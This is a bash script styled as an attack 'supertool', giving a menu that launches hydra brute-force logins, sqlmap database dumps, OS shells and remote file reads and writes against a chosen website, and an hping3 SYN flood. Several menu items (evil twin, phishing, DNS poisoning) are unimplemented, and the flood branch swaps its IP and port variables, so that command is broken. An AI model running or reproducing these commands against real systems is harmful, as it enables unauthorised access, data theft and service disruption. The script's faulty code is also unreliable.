#!/usr/bin/bash

BLUE='\033[1;34m'
GREEN='\033[1;32m'
orange='\033[1;38;5;208m'
NC='\033[0m'

	echo -e "${BLUE} _    _ _"   
	echo "| |__(_) |_" 
	echo "| '_ \ |  _|"
	echo "|_.__/_|\__|"
	echo -e " supertool${NC}" 
	echo
	echo -e "${GREEN}Type \"help\" to see all commands.${NC}"
	echo
	echo "1) Evil twin"
	echo "2) MITM"
	echo "3) Bruteforce"
	echo "4) Phishing"
	echo "5) SQL injection"
	echo "6) DNS poisoning"
	echo "7) DOS"
	echo "8) DDOS"
	while true; do
		echo -n ">> "
		read bittool
		case "$bittool" in
			exit)
			break
			;;
			help)
			echo "exit"
			echo "<1-8>"
			;;
			2)
			echo -e "${orange}[-]${NC} Install wireshark (if not already installed). And see every packet sent in your network!"
			;;
			3)
			read -p "Enter bruteforce (<'user'/'password'/'both'>): " bt3b
			read -p "Enter IP and service (<service>://<ip>): " bt3s
			if [ "$bt3b" == "user" ]; then
				read -p "Enter userlist: " bt3buu
				read -p "Enter password: " bt3bup
				hydra -L "$bt3buu" -p "$bt3bup" "$bt3s"
			elif [ "$bt3b" == "password" ]; then
				read -p "Enter passlist: " bt3bpp
				read -p "Enter user: " bt3bpu
				hydra -l "$bt3bpu" -P "$bt3bpp" "$bt3s"
			elif [ "$bt3b" == "both" ]; then
				read -p "Enter userlist: " bt3bbu
				read -p "Enter passlist: " bt3bbp
				hydra -L "$bt3bbu" -P "$bt3bbp" "$bt3s"
			fi
			;;
			5)
			echo "1) Dump databases"
			echo "2) Reverse shell"
			echo "3) Read"
			echo "4) Write"
			read -p "Enter choice (1-4): " bt5
			case "$bt5" in
				1)
				read -p "Enter website: " bt51
				sqlmap -u "$bt51" --dump
				;;
				2)
				read -p "Enter website: " bt52
				sqlmap -u "$bt52" --os-shell
				;;
				3)
				read -p "Enter website and file (<website> <file>): " bt53
				IFS=' ' read -r bt53w bt53f <<< "$bt53"
				sqlmap -u "$bt53w" --file-read="$bt53f"
				;;
				4)
				read -p "Enter (<website> <website file> <replacing file>): " bt54
				IFS=' ' read -r bt54w bt54f bt54r <<< "$bt54"
				sqlmap -u "$bt54w" --file-write="$bt54r" --file-dest="$bt54f"
				;;	
			esac
			;;
			7)
			read -p "Enter IP and port (<ip> <port>): " bt7
			IFS=' ' read -r bt7port bt7ip <<< "$bt7"
			sudo hping3 -S -p "$bt7port" --flood "$bt7ip"
			;;
			8)
			echo -e "${orange}[-] ${NC}run the DOS attack on multiple computers all to one target."
			;;
		esac
	done
